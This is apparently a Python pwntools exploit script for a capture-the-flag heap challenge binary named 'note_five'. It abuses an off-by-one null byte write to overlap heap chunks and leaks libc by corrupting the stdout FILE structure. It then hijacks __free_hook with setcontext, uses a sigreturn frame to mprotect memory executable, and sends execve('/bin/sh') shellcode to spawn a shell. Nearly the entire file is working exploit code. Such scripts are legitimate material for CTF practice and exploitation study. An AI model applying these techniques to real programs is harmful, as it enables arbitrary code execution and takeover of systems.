#coding=utf-8
from pwn import *
local = 1
exec_file="./note_five"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file)

#a=remote("")

def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc.so.6" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    b *($text_base+0x000000000000D45)
    b *($text_base+0x000000000000DF3)
    b *($text_base+0x000000000000EA9)
    '''
    gdb.attach(a,script)

def menu(idx):
    a.sendlineafter("choice>> ",str(idx))
def add(idx,size):
    menu(1)
    a.sendlineafter("idx: ",str(idx))
    a.sendlineafter("size: ",str(size))
def delete(idx):
    menu(3)
    a.sendlineafter("idx: ",str(idx))
def edit(idx,content):
    menu(2)
    a.sendlineafter("idx: ",str(idx))
    a.sendafter(": ",content)
while 1:
    try:
        a=process(exec_file)
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
        add(0,0xf8)
        add(1,0x310)
        add(2,0x100)#
        add(3,0x100)#
        edit(1,'A'*0x2f0+p64(0x300)+'\n')

        delete(1)
        edit(0,'A'*0xf8+'\x00\n')
        #debug()
        add(1,0xf8)
        add(0,0xf8)
        add(3,0xf8)
        delete(1)
        delete(2)
        #debug()
        add(1,0x120-8)
        add(4,0x330-8-0x20)
        #delete(3)
        edit(4,p64(0x21)*0x1b+p64(0x231)+p64(0)+'\xe8\x27'+'\n')
        delete(3)
        #debug()
        edit(4,p64(0x21)*0x1b+p64(0x231)+p64(0)+'\xe8\x27'+'\n')
        add(3,0x230-8)
        edit(1,'A'*0xf8+p64(0xf1)+'\x20\x26\xdd\n')
        #debug()
        delete(0)
        edit(1,'A'*0xf8+p64(0xf1)+'\xcf\x15\n')
        #debug()
        add(0,0xf0-8)
        #debug()
        add(4,0xf0-8)
        edit(4,p64(0xf1)*6+'A'*(0x61-32-48)+p64(0xfbad1800)+'A'*24+'\x00\n')
        a.recvuntil(p64(0xfbad1800))
        a.recvuntil("\x7f")
        libc_base=u64(a.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.symbols["_IO_2_1_stdout_"]-131
        #print hex(libc_base)
        success("libc_base ==> 0x%x"%libc_base)
        __malloc_hook=libc_base+libc.symbols["__malloc_hook"]
        __realloc_hook=__malloc_hook-8
        realloc=libc_base+libc.symbols["realloc"]
        success("__malloc_hook ==> 0x%x"%__malloc_hook)
        fake_chunk=0x7ffff7dd196f-0x7ffff7a0d000+libc_base
        edit(4,p64(0xf1)*6+'A'*(0x61-32-48)+p64(0xfbad2887)+'\n')


        stdout=libc_base+libc.symbols["_IO_2_1_stdout_"]
        delete(0)
        edit(1,'A'*0xf8+p64(0xf1)+p64(0x7ffff7dd26db-0x7ffff7a0d000+libc_base)+'\n')
        add(0,0xf0-8)
        #debug()
        add(4,0xf0-8)
        payload='\x00'*0xd+p64(0x7ffff7dd06e0-0x7ffff7a0d000+libc_base)
        payload=payload.ljust(0x1d,'\x00')+p64(stdout)
        payload=payload.ljust(0xf0-8-8,'\x00')+p64(0xf1)
        edit(4,payload+'\n')
        print "1 : "+hex(0x7ffff7dd27d3)
        #debug()
        #debug()

        delete(0)
        edit(1,'A'*0xf8+p64(0xf1)+p64(0x7ffff7dd27c3-0x7ffff7a0d000+libc_base)+'\n')
        add(0,0xf0-8)
        #debug()
        add(4,0xf0-8)
        payload='\x00'*0xd+p64(0x7ffff7dd06e0-0x7ffff7a0d000+libc_base)
        payload=payload.ljust(0x1d,'\x00')+p64(stdout)
        payload=payload.ljust(0xf0-8-8,'\x00')+p64(0xf1)
        edit(4,payload+'\n')
        print "1 : "+hex(0x7ffff7dd28b3)
        #debug()

        delete(0)
        edit(1,'A'*0xf8+p64(0xf1)+p64(0x7ffff7dd28ab-0x7ffff7a0d000+libc_base)+'\n')
        add(0,0xf0-8)
        #debug()
        add(4,0xf0-8)
        payload='\x00'*0xd+p64(0x7ffff7dd06e0-0x7ffff7a0d000+libc_base)
        payload=payload.ljust(0x1d,'\x00')+p64(stdout)
        payload=payload.ljust(0xf0-8-8,'\x00')+p64(0xf1)
        edit(4,payload+'\n')
        print "1 : "+hex(0x7ffff7dd299b)
        #debug()

        for i in range(1,17):
            delete(0)
            edit(1,'A'*0xf8+p64(0xf1)+p64(0x7ffff7dd28ab-0x7ffff7a0d000+libc_base+i*0xe8)+'\n')
            add(0,0xf0-8)
            #debug()
            add(4,0xf0-8)
            payload='\x00'*0xd+p64(0x7ffff7dd06e0-0x7ffff7a0d000+libc_base)
            payload=payload.ljust(0x1d,'\x00')+p64(stdout)
            payload=payload.ljust(0xf0-8-8,'\x00')+p64(0xf1)
            edit(4,payload+'\n')
            print "1 : "+hex(0x7ffff7dd299b+i*0xe8)
        __free_hook=libc_base+libc.symbols["__free_hook"]
        new_execve_env=(__free_hook)&0xfffffffffffff000
        shellcode1 = '''
        xor rdi, rdi
        mov rsi, %d
        mov edx, 0x1000

        mov eax, 0
        syscall

        jmp rsi
        ''' % new_execve_env
        payload="/bin/sh\x00"+'\x00'*(0x6d-8)+p64(libc_base+libc.symbols["setcontext"]+53)
        payload+=p64(__free_hook+16)+asm(shellcode1)
        #edit(4,"/bin/sh\x00"+'\x00'*(0x6d-8)+p64(libc_base+libc.symbols["setcontext"])+'\n')
        edit(4,payload+'\n')
        context.arch = "amd64"
        # 设置寄存器
        frame = SigreturnFrame()
        frame.rsp = __free_hook + 8
        frame.rip = libc_base + libc.symbols['mprotect'] # 0xa8 rcx
        frame.rdi = new_execve_env
        frame.rsi = 0x1000
        frame.rdx = 4 | 2 | 1
        #debug()
        edit(0,str(frame)+'\n')
        delete(0)
        pause()
        shellcode_x64 = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
        a.sendline(shellcode_x64)

        a.interactive()
    except:
        a.close()
        continue





